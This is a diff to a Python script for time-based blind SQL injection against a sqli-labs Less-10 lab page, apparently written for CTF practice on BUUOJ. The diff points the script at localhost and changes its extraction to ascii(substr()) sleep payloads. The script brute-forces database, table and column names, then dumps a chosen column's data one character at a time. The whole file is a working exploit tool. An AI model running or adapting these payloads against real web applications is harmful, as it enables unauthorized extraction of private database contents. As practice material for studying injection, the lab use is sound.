@@ -4,19 +4,18 @@ from time import time
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://67ce2a74-778d-4bf4-b0ff-fc208a33b67e.node4.buuoj.cn/Less-10/?id=1'
+baseurl = 'http://127.0.0.1:81/Less-10/?id=1'
 # less9:'  less10:"
 poc = '\"'
-sleepTime = 10
+sleepTime = 1
 
 
 def get(url, header=standardHeader):
     res = req.get(url, headers=header)
-    sleep(1)
     return res
 
 def checkRes(startTime, endTime):
-    if endTime-startTime < sleepTime+1:
+    if endTime-startTime < sleepTime:
         return True
     else:
         return False
@@ -25,25 +24,26 @@ def checkRes(startTime, endTime):
 def forceDatabases(pocUrl):
     payload = "(select group_concat(schema_name) from information_schema.schemata)"
     print("Forcing database length")
-    for databaseConcatLength in range(50,9999):
+    for databaseConcatLength in range(50,999):
         startTime = time()
         expUrl = pocUrl + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(databaseConcatLength), str(sleepTime))
         # print(expUrl)
         res = get(expUrl)
         endTime = time()
+        # print(checkRes(startTime, endTime), end="\n\n")
         if not checkRes(startTime, endTime):
             print("Database length is {}\nForcing each char".format(databaseConcatLength))
             allDatabases = ''
-            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
+            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
             for index in range(1,databaseConcatLength+1):
                 for char in sqlForce:
-                    nowDatabases = allDatabases + char
-                    expUrl = pocUrl + payload.format(str(index), nowDatabases, str(sleepTime))
+                    # print(expUrl)
+                    expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
                     startTime = time()
                     res = get(expUrl)
                     endTime = time()
                     if not checkRes(startTime, endTime):
-                        allDatabases = nowDatabases
+                        allDatabases = allDatabases + char
                         print(allDatabases)
                         break
             return allDatabases
@@ -61,16 +61,15 @@ def forceTables(pocUrl, database):
         if not checkRes(startTime, endTime):
             print("Tables length is {}\nForcing each char".format(tableConcatLength))
             allTables = ''
-            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
+            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
             for index in range(1, tableConcatLength + 1):
                 for char in sqlForce:
-                    nowTables = allTables + char
-                    expUrl = pocUrl + payload.format(str(index), nowTables, str(sleepTime))
+                    expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
                     startTime = time()
                     res = get(expUrl)
                     endTime = time()
                     if not checkRes(startTime, endTime):
-                        allTables = nowTables
+                        allTables = allTables + char
                         print(allTables)
                         break
             return allTables
@@ -87,23 +86,22 @@ def forceColumns(pocUrl, table):
         if not checkRes(startTime, endTime):
             print("Tables length is {}\nForcing each char".format(columnConcatLength))
             allColumns = ''
-            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
+            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
             for index in range(1, columnConcatLength + 1):
                 for char in sqlForce:
-                    nowColumns = allColumns + char
-                    expUrl = pocUrl + payload.format(str(index), nowColumns, str(sleepTime))
+                    expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
                     startTime = time()
                     res = get(expUrl)
                     endTime = time()
                     if not checkRes(startTime, endTime):
-                        allColumns = nowColumns
+                        allColumns = allColumns + char
                         print(allColumns)
                         break
             return allColumns
 
 
 def dumpData(pocUrl, database, table, column='*'):
-    payload = "(select {} from {}.{})".format(column, database, table)
+    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
     print("Forcing all data's length")
     for dataConcatLength in range(1, 9999):
         startTime = time()
@@ -113,16 +111,15 @@ def dumpData(pocUrl, database, table, column='*'):
         if not checkRes(startTime, endTime):
             print("Tables length is {}\nForcing each char".format(dataConcatLength))
             allData = ''
-            payload = "and if(left(" + payload + ",{})='{}', sleep({}), 1) -- -"
+            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
             for index in range(1, dataConcatLength + 1):
                 for char in sqlForce:
-                    nowData = allData + char
-                    expUrl = pocUrl + payload.format(str(index), nowData, str(sleepTime))
+                    expUrl = pocUrl + payload.format(str(index), ord(char), str(sleepTime))
                     startTime = time()
                     res = get(expUrl)
                     endTime = time()
                     if not checkRes(startTime, endTime):
-                        allData = nowData
+                        allData = allData + char
                         print(allData)
                         break
             return allData
@@ -140,6 +137,6 @@ if __name__ == '__main__':
     columns = forceColumns(baseurl+poc, table)
     print('Input a column to force all data:')
     dumpColumn = input()
-    data = dumpData(baseurl+poc, database='ctftraining', table='flag', column=dumpColumn)
+    data = dumpData(baseurl+poc, database=database, table=table, column=dumpColumn)
     print(data)
 
